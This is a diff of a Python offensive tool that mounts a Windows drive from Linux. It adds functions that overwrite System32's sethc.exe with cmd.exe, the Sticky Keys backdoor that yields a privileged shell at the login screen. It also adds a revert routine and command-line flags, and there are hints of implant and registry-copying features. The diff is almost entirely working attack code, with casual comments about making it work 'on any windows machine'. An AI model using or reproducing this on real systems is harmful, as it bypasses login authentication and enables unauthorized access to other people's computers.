@@ -151,6 +151,33 @@ def locate_registry_paths():
                 hive))
     return targets
 
+
+def locate_cmd():
+    # gotta make this shit find stickykeys exe on any windows machine
+    target_directories = dict()
+    base_dir = os.listdir('/mnt/windows')
+    
+    targets = []
+    for next_dir in base_dir:
+        if 'windows' == next_dir.casefold():
+            target_directories['windows'] = next_dir
+    for next_dir in os.listdir('/mnt/windows/{}'.format(
+            target_directories['windows'])):
+        if 'system32' == next_dir.casefold():
+            target_directories['system32'] = next_dir
+    for next_dir in os.listdir('/mnt/windows/{}/{}'.format(
+            target_directories['windows'], 
+            target_directories['system32'])):
+        if 'cmd.exe' == next_dir.casefold():
+            target_directories['cmd']  = next_dir
+            targets.append('{}/{}/{}'.format(target_directories["windows"], 
+                target_directories["system32"],
+                target_directories["cmd"]))
+
+        
+    return target_directories 
+
+
 def get_sticky_shell():
 
         # gotta use the mount point made by mount_drive here from the 
@@ -161,9 +188,9 @@ def get_sticky_shell():
         #print(os.listdir('/mnt/windows/{}/{}'.format(target_paths["windows"], 
         #        target_paths["system32"])))
         
-        stamp = str(datetime.datetime.now().timestamp())
-        directory = '{}/sticky_binary{}'.format(os.getcwd(), stamp[:10])
-        os.mkdir(directory) 
+        #stamp = str(datetime.datetime.now().timestamp())
+        #directory = '{}/sticky_binary{}'.format(os.getcwd(), stamp[:10])
+        #os.mkdir(directory) 
         #print('/mnt/windows/{}/{}/{}'.format(
         #        target_paths["windows"], 
         #        target_paths["system32"],
@@ -188,12 +215,118 @@ def get_sticky_shell():
                 target_paths["system32"],
                 target_paths["sethc"]))
 
+        target_paths = locate_cmd()
 
-        print('stickykeyz binary have been succesfully exfiltrated to your pwd')
+        print(target_paths)
+        try:
+            shutil.copyfile('/mnt/windows/{}/{}/{}'.format(
+                target_paths["windows"], 
+                target_paths["system32"],
+                target_paths["cmd"]), 
+
+                '/mnt/windows/{}/{}/sethc.exe'.format(
+                target_paths["windows"], 
+                target_paths["system32"]))
+
+        except FileNotFoundError as e:
+            print(e)
+            print('/mnt/windows/{}/{}/{} was not found'.format(
+                target_paths["windows"], 
+                target_paths["system32"],
+                target_paths["cmd"]))
+
+
+
+
+
+        print('stickykeyz binary has been succesfully swapped with cmd.exe')
         # optimize this...
         time.sleep(1)
         subprocess.Popen('sudo umount /mnt/windows', shell=True)
         print('Drive has been unmounted from /mnt/windows')
+
+
+def locate_sticky_keyzbak():
+    # gotta make this shit find stickykeys exe on any windows machine
+    target_directories = dict()
+    base_dir = os.listdir('/mnt/windows')
+    
+    targets = []
+    for next_dir in base_dir:
+        if 'windows' == next_dir.casefold():
+            target_directories['windows'] = next_dir
+    for next_dir in os.listdir('/mnt/windows/{}'.format(
+            target_directories['windows'])):
+        if 'system32' == next_dir.casefold():
+            target_directories['system32'] = next_dir
+    for next_dir in os.listdir('/mnt/windows/{}/{}'.format(
+            target_directories['windows'], 
+            target_directories['system32'])):
+        if 'sethc.exe.bak' == next_dir.casefold():
+            target_directories['sethc']  = next_dir
+            targets.append('{}/{}/{}'.format(target_directories["windows"], 
+                target_directories["system32"],
+                target_directories["sethc"]))
+
+        
+    return target_directories 
+
+
+
+
+
+def revert_sticky_shell():
+
+        # gotta use the mount point made by mount_drive here from the 
+        # user input i should implement some code that suggests a drive 
+        # to choose based off of mounting other ones and lsing
+        # them. This will be slow but very cool
+        target_paths = locate_sticky_keyzbak()
+        #print(os.listdir('/mnt/windows/{}/{}'.format(target_paths["windows"], 
+        #        target_paths["system32"])))
+        
+        #stamp = str(datetime.datetime.now().timestamp())
+        #directory = '{}/sticky_binary{}'.format(os.getcwd(), stamp[:10])
+        #os.mkdir(directory) 
+        #print('/mnt/windows/{}/{}/{}'.format(
+        #        target_paths["windows"], 
+        #        target_paths["system32"],
+        #        target_paths["sethc"])) 
+    
+        try:
+            shutil.copyfile('/mnt/windows/{}/{}/{}'.format(
+                target_paths["windows"], 
+                target_paths["system32"],
+                target_paths["sethc"]), 
+
+                '/mnt/windows/{}/{}/{}'.format(
+                target_paths["windows"], 
+                target_paths["system32"],
+                target_paths["sethc"].replace('.bak', '')))
+
+        except FileNotFoundError as e:
+            print(e)
+            print('/mnt/windows/{}/{}/{} was not found'.format(
+                target_paths["windows"], 
+                target_paths["system32"],
+                target_paths["sethc"]))
+
+        os.remove('/mnt/windows/{}/{}/{}'.format(
+                target_paths["windows"], 
+                target_paths["system32"],
+                target_paths["sethc"])) 
+
+
+
+
+        print('stickykeyz binary has been succesfully restored')
+        # optimize this...
+        time.sleep(1)
+        subprocess.Popen('sudo umount /mnt/windows', shell=True)
+        print('Drive has been unmounted from /mnt/windows')
+
+
+
 
 
 def copy_registries():
@@ -329,6 +462,7 @@ def main():
     group.add_argument('-i', '--implant', action='store_true')
     group.add_argument('-pd', '--print_drives', action='store_true')
     group.add_argument('-sk', '--sticky_keyz', action='store_true')
+    group.add_argument('-rsk', '--remove_sticky_keyz', action='store_true')
 
     args = parser.parse_args()
 
@@ -345,6 +479,9 @@ def main():
     elif args.sticky_keyz:
         if check_for_windrives(raw_drives):
             get_sticky_shell()
+    elif args.remove_sticky_keyz:
+        if check_for_windrives(raw_drives):
+            revert_sticky_shell()
 
 
 #    elif args.implant:
